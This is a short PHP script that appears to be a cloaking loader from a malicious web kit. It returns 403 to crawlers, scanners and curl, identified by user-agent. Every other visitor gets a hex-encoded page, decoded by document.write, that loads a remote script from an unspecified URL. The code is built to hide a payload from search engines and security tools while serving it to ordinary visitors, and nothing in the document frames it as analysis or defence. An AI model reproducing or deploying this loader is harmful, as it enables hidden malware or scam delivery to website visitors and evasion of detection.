<?php
header('X-Robots-Tag: noindex, nofollow');
header('Referrer-Policy: no-referrer');
header('Content-Type:text/html');

if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
http_response_code(403); 
exit();
}

else{
$contentHTML = '
<html>
<head>
<meta http-equiv="cache-control" content="no-cache">
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
</head>
<body>
<script src="'.$url.'" type="text/javascript" async="true"></script>
</body>
</html>';

$contentHTMLEXTRAIDO = $contentHTML;	
$decode =  utf8_decode($contentHTMLEXTRAIDO);
$hex = bin2hex($decode);	
$script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';
		

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
echo $script;

}
?>
